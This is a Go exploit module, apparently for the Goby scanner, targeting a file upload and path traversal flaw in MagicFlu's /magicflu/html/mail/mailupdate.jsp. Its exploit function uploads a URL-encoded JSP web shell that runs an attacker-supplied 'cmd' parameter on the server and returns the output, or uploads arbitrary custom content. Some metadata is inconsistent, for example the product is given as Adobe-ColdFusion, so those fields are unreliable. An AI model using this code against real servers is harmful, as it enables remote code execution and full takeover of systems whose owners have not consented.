package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Rubik's Cube Netlist /magicflu/html/mail/mailupdate.jsp File Upload Vulnerability",
    "Description": "<p>Rubik's Cube Netwatch is a management software DIY platform product developed by Beijing Rubik's Cube Everlasting Software Co., Ltd. It is a web database application platform. Attackers can use this vulnerability to upload arbitrary files, execute code arbitrarily, write backdoors, gain server privileges, and then control the entire web server, causing the website to be in an extremely insecure state.</p>",
    "Product": "Adobe-ColdFusion",
    "Homepage": "https://www.magicflu.com/",
    "DisclosureDate": "2024-03-30",
    "PostTime": "2024-04-17",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title==\"Apache Tomcat/8.5.66\" || title=\"Apache Tomcat/8.0.26\" || title=\"准备登录\" || title=\"装载中\"",
    "GobyQuery": "title==\"Apache Tomcat/8.5.66\" || title=\"Apache Tomcat/8.0.26\" || title=\"准备登录\" || title=\"装载中\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to upload arbitrary files, execute code arbitrarily, write backdoors, gain server privileges, and then control the entire web server, causing the website to be in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.magicflu.com/\">https://www.magicflu.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom,cmd",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "your content",
            "show": "attackType=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "魔方网表 /magicflu/html/mail/mailupdate.jsp 文件上传漏洞",
            "Product": "魔方网表",
            "Description": "<p>魔方网表是北京魔方恒久软件有限公司研发的一款管理软件DIY平台产品，是一个Web数据库应用平台。攻击者可通过该漏洞上传任意文件，任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器，导致⽹站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.magicflu.com/\">https://www.magicflu.com/</a><a href=\"https://www.adobe.com/\" target=\"_blank\"></a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞上传任意文件，任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Rubik's Cube Netlist /magicflu/html/mail/mailupdate.jsp File Upload Vulnerability",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Rubik's Cube Netwatch is a management software DIY platform product developed by Beijing Rubik's Cube Everlasting Software Co., Ltd. It is a web database application platform. Attackers can use this vulnerability to upload arbitrary files, execute code arbitrarily, write backdoors, gain server privileges, and then control the entire web server, causing the website to be in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.magicflu.com/\">https://www.magicflu.com/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>Attackers can use this vulnerability to upload arbitrary files, execute code arbitrarily, write backdoors, gain server privileges, and then control the entire web server, causing the website to be in an extremely insecure state.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10942"
}`
	setGetRequestHash1713326593 := func(hostInfo *httpclient.FixUrl, url string) (*httpclient.HttpResponse, error) {
		head := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
		}
		GetRequest := httpclient.NewGetRequestConfig(url)
		GetRequest.VerifyTls = false
		GetRequest.FollowRedirect = false
		for headName, headValue := range head {
			GetRequest.Header.Store(headName, headValue)
		}
		if resp, err := httpclient.DoHttpRequest(hostInfo, GetRequest); resp != nil && resp.StatusCode == 200 {
			return resp, err
		} else {
			return nil, err
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(6) + ".jsp"
			content := strings.ReplaceAll(url.QueryEscape("<% out.println(\"checkString\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"), "+", "%20")
			url := "/magicflu/html/mail/mailupdate.jsp?messageid=/../../../" + filename + "&messagecontent=" + content + ""
			if resp, _ := setGetRequestHash1713326593(hostInfo, url); resp != nil {
				urlGet := "/magicflu/" + filename
				if respGet, _ := setGetRequestHash1713326593(hostInfo, urlGet); respGet != nil && strings.Contains(respGet.Utf8Html, "checkString") {
					ss.VulURL = hostInfo.FixedHostInfo + url
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			filename := goutils.RandomHexString(6) + ".jsp"
			if attacktype == "custom" {
				content := strings.ReplaceAll(url.QueryEscape(goutils.B2S(ss.Params["custom"])), "+", "%20")
				url := "/magicflu/html/mail/mailupdate.jsp?messageid=/../../../" + filename + "&messagecontent=" + content + ""
				if resp, _ := setGetRequestHash1713326593(expResult.HostInfo, url); resp != nil {
					urlGet := "/magicflu/" + filename
					expResult.Success = true
					expResult.Output = expResult.HostInfo.FixedHostInfo + urlGet
				} else {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
			} else if attacktype == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				content := "%3c%25%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%6d%64%22%29%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%20%69%6e%74%20%61%20%3d%20%2d%31%3b%20%62%79%74%65%5b%5d%20%62%20%3d%20%6e%65%77%20%62%79%74%65%5b%32%30%34%38%5d%3b%20%77%68%69%6c%65%28%28%61%3d%69%6e%2e%72%65%61%64%28%62%29%29%21%3d%2d%31%29%7b%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%62%29%29%3b%20%7d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%20%25%3e"
				url := "/magicflu/html/mail/mailupdate.jsp?messageid=/../../../" + filename + "&messagecontent=" + content + ""
				if resp, _ := setGetRequestHash1713326593(expResult.HostInfo, url); resp != nil {
					urlGet := "/magicflu/" + filename + "?cmd=" + cmd
					if respGet, _ := setGetRequestHash1713326593(expResult.HostInfo, urlGet); respGet != nil && strings.Contains(respGet.Utf8Html, "nt") {
						expResult.Success = true
						expResult.Output = respGet.RawBody
					} else {
						expResult.Success = false
						expResult.Output = "利用失败"
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
